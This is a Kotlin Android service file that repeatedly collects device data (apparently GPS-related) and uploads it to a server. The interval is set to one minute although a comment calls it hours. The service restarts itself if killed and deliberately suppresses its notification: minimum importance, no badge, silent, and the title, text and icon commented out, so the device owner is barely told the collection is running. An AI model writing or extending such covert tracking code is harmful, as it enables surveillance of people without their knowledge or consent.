package com.extreme.androiddatacollector

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import kotlin.time.Duration.Companion.minutes

class DataCollectionService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isCollecting = false

    companion object {
        const val CHANNEL_ID = "DataCollectionChannel"
        const val NOTIFICATION_ID = 1
        const val ACTION_START = "ACTION_START"
        const val ACTION_STOP = "ACTION_STOP"

        // ИНТЕРВАЛ ОТПРАВКИ (в часах)
        val HOURS_DELAY = 1.minutes

        fun startService(context: Context) {
            val intent = Intent(context, DataCollectionService::class.java).apply {
                action = ACTION_START
            }
            context.startForegroundService(intent)
        }

        fun stopService(context: Context) {
            val intent = Intent(context, DataCollectionService::class.java).apply {
                action = ACTION_STOP
            }
            context.startForegroundService(intent)
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                Log.d("DataCollectionService", "Запуск службы (интервал: $HOURS_DELAY ч.)")
                startForeground(NOTIFICATION_ID, createNotification())
                startDataCollection()
            }
            ACTION_STOP -> {
                Log.d("DataCollectionService", "Остановка службы")
                stopDataCollection()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
        }
        return START_STICKY // Автоперезапуск, если система убьёт
    }

    private fun startDataCollection() {
        if (isCollecting) return
        isCollecting = true

        serviceScope.launch {
            // Первая отправка сразу при старте
            sendOnce()

            // Дальше — по расписанию
            while (isCollecting) {
                delay(HOURS_DELAY)
                sendOnce()
            }
        }
    }

    private suspend fun sendOnce() {
        try {
            Log.d("DataCollectionService", "📤 Сбор и отправка данных...")
            val deviceInfo = DeviceDataCollector.collect(this@DataCollectionService)
            val result = DataSender.sendData(deviceInfo)

            result.fold(
                onSuccess = { Log.d("DataCollectionService", "Успешно: $it") },
                onFailure = { Log.e("DataCollectionService", "Ошибка: ${it.message}") }
            )
        } catch (e: Exception) {
            Log.e("DataCollectionService", "Исключение: ${e.message}", e)
        }
    }

    private fun stopDataCollection() {
        isCollecting = false
        serviceScope.coroutineContext.cancelChildren()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Фоновый сбор данных",
            NotificationManager.IMPORTANCE_MIN // Минимальная важность — не беспокоит
        ).apply {
            description = "Служба отправляет данные о устройстве на сервер"
            setShowBadge(false) // Не показывать бейдж на иконке
        }
        getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
//            .setContentTitle("GPS Data Collector")
//            .setContentText("Сбор данных каждые $HOURS_DELAY ч.")
//            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN) // Тихое уведомление
            .setOngoing(false) // true -> false
            .setSilent(true) // Без звука и вибрации
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopDataCollection()
        serviceScope.cancel()
    }
}